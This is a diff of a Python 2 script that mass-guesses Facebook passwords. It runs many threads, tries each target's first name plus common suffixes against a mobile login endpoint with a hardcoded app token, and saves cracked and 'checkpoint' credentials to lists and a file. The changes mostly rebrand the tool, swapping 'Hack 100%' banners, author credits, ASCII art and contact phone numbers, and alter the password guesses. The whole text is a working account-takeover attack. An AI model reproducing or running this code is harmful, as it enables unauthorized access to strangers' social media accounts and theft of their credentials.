 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass3
+								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass3
+									print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
 									cek = open("out/checkpoint.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = b['first_name'] + '123'
+									pass4 = b['first_name'] + '12345'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
-										print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass4
+										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass4
+											print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
 											cek = open("out/checkpoint.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = 'Pakistan786'
+											pass5 = b['first_name'] + '1234'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
-												print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass5
+												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass5
+													print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
 													cek = open("out/checkpoint.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Pakistan1'
+													pass6 = b['first_name'] + '123'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
-														print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass6
+														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass6
+															print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
 															cek = open("out/checkpoint.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
@@ -467,15 +396,15 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = b['first_name'] + '786'
+															pass7 = b['first_name'] + 'afridi'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
-																print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass7
+																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass7
+																	print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
 																	cek = open("out/checkpoint.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
@@ -485,39 +414,25 @@ def pilih_super():
 		except:
 			pass
 		
-	p = ThreadPool(50)
+	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mrameezsarwar\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;93m«---•◈•---Developed By Rameez Sarwar--•◈•---»" #Dev:ITX RAMI
-	print '\033[1;96m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 rameezsarwar.py)↩\033[1;97m....'
-	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;93m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
+	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mBlackMafia\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
+	print "  \033[1;93m«❥•❥•❥•❥•Developed By love❥•❥•❥•❥•»" #Dev:love_hacker
+	print '\033[1;93mProcess Has Been Completed\033[1;97m....'
+	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print """
-                         ¸,.-~·¹´¨¨¨¨¨¨¨¨¨¨¨¨¨¨`²·~-.,¸        
-                     .·´;:':                              `·. 
-                 .·´;;:: ':                                   `·. 
-     '        .·´;;;:::  :                  '                     \ 
-            /;;;.·´¨¨¨` · .                      . · ´¨¨¨¨`·.     ',    
-          ,';;;/;:: :       `·.            '   ·'              \     ; 
-          ;';,';;::: :'         '\            ·:                 ',   ; 
-          ;'/¸.·´¨¨` · . `·.     ',   !   ,':    .·´ . · ´¨¨¨¨`·.¸\  ;  
-          ',;;',:::      `·.      ';      ;::    .·´            /  ,'      
-           ',;;'\::        ' \     ';     ;: ,' /           .·´   ,' 
-       '     `·.;'`·.         '',   ;     ;  ,'         .·´   ¸.·´ 
-                '`·.: `¹·~-.,¸ \ ,'      ',/¸,.-~·¹´  '  .·´          
-                    `·.;:'      `'`       ´'´        ' .·´  
-                       `·.:          ´ `          .·´          
-                          `·.,¸    ¸,.-.     .·´ 
-                             ·;~-.¸     ¸,.;´
-      
-Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
-
-•\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;96m ....Itx Rami....... \033[1;93m :
-•\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
- If you have any problems then contact with me on WhatsApp Number
-              \033[1;96m +923075151073"""
+             
+             ...........███ ]▄▄▄▄▄▃❥•❥•❥•❥•
+             ..▂▄▅█████▅▄▃▂
+             [███████████████]
+             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
+••••••••••••••❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•••••••••••.
+: \033[1;97m ❥•❥•❥•❥•lovehacker  BlackMafia❥•❥•❥•❥• \033[1;93m :
+••••••••••••••❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•••••••••••.' 
+                whatsapp Num
+               +923094161457"""
 	
-	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
+	raw_input("\n\033[1;93m[\033[1;91mBack\033[1;93m]")
 	menu()
 
 if __name__ == '__main__':
